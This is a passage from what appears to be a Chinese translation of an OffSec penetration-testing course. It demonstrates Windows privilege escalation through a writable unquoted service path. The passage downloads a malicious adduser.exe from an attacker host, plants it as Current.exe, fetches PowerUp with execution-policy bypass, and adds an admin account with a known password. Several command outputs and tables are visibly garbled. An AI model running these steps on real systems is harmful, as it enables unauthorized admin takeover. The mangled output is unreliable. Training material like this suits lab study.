
```powershell
PS C:\Users\steve icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI) (F)
NT AUTHORITY\SYSTEM: (OI) (CI) (F)
BUILTIN\Administrators: (OI) (CI) (F)
BUILTIN\Users: (OI) (CI) (RX,W)
CREATOR OWNER: (OI) (CI) (OI) (F)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED
PACKAGES: (OI) (CI) (RX)

APPLICATION PACKAGES: (OI) (CI) (RX)

成功处理 1 文件；处理失败 0 文件
```

列表 443 - 检查 Enterprise Apps 目录的权限

列表 443 显示 `BUILTIN\Users` 在 `C:\Program Files\Enterprise Apps` 具有写入 (`w`) 权限。我们的目标是在 `C:\Program Files\Enterprise Apps\` 放置恶意文件 `Current.exe`。

我们可以通过从 Kali 编译来使用 `adduser.exe` 二进制文件。一旦服务器运行，我们就可以 `steve` 的身份在目标机器上下载 `adduser.exe`。为了我们的权限提升正确命名保存文件，我们将 `Current.exe` 作为参数。文件下载后，将其复制到 `C:\Program Files\Enterprise Apps\`。

PWK - © 2023 OffSec Services. all rights reserved.
Made in Morocco![](img/987dcf6ebd889356a1d247e6.png)

# OffSec

## 使用 Kali Linux 进行渗透测试

```powershell
PS C:\Users\steve iwr http://192.168.119.3/adduser.exe -Outfile Current.exe
```

```powershell
PS C:\Users\steve copy Current.exe 'C:\Program Files\Enterprise Apps\'
```

列表 444 - 启动服务，Current.exe 已创建并复制到 Enterprise Apps 目录

现在，我们准备好启动，应该执行 `Current.exe` 而不是原始服务二进制 `GammaServ.exe`。为此，我们使用 `Start-Service` 参数检查 `dave2` 是否创建，并使用 `netgroup administrators` 确认 `dave2` 是否被添加到本地管理员组。

```powershell
PS C:\Users\steve Start-Service GammaService

Start-Service : 'GammaService (GammaService)' 无法启动，由于以下错误：在计算机上启动服务。

行:1:

+ Start-Service GammaService

-------------------------------------------------

+ CategoryInfo : OpenError:(System.ServiceProcess.ServiceController,ServiceController) [ServiceCommandException]

+ FullyQualifiedErrorCode : StartFailed,Microsoft.PowerShell.Commands.ServiceCommand
```

```powershell
PS C:\Users\steve net user Administrator | BackupAdmin |

| dave2 | daveadmin |

| Guest | offsec |

| WDAGUtilityAccount | |
命令执行成功。
```
```powershell
PS C:\Users\steve net localgroup administrators
```

--------------------------------

命令执行成功。

列表 445 - 启动服务并确认 dave2 作为本地管理员组的成员

列表 445 显示 `Start-Service` 命令显示 Windows 无法启动服务。错误源于我们的交叉编译代码不接受提供的参数。`Current.exe` 仍然执行，且 `dave2` 已创建为本地管理员组的成员。太棒了！

为了恢复原始服务的功能，我们必须停止服务并删除我们的二进制文件 `Current.exe`。一旦删除可执行文件，Windows 将再次使用服务二进制 `GammaServ.exe`。

PWK - Copyright 2023 OffSec Services Limited. All rights reserved.

Made in Morocco

# OffSec

## 使用 Kali Linux 进行渗透测试

在我们结束节之前，让我们检查 PowerUp 是否识别此漏洞。为此，我们像之前一样使用 `iwr` 下载 PowerUp 并将其导入 PowerShell 会话中。我们将 `ExecutionPolicy` 设置为 `Bypass` 并使用 `Get-UnquotedService`。

```powershell
PS C:\Users\dave> iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\dave> powershell -ep bypass
PS C:\Users\dave> ..PowerUp.ps1
PS C:\Users\dave> Get-UnquotedService
```

```powershell
ServiceName : GammaService
Path : C:\Program Files\Apps\Current Version\GammaService.exe
ModifiablePath : @(ModifiablePath=C:\); IdentityReference=NT AUTHORITY.Authenticated
Users : LocalSystem
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'GammaService' -Path HijackPath
CanRestart : True
ServiceName : GammaService
Path : C:\Program Files\Apps\Current Version\GammaService.exe
ModifiablePath : @(ModifiablePath=C:\); IdentityReference=NT AUTHORITY.Authenticated
Users : Object[]
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'GammaService' -Path HijackPath
CanRestart : True
```

列表 446 - 使用识别为漏洞的 GammaService。让我们使用 `AbuseFunction` 并重启服务以尝试提升权限。对于 `-Path`，我们输入与在列表 444 中相同的 `Current.exe` 路径。如所述，默认操作是创建一个新的本地用户，并关联密码 `Password123!`。此外，该用户被被添加到本地管理员组。

```cmd
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Apps\Current.exe"
ServiceName Path Command
| :--- | :--- | :--- |
| GammaService :C:\Program Files\Apps\Current.exe | not user join Password123! |
| /add && timeout /t 5 && net coll |
```
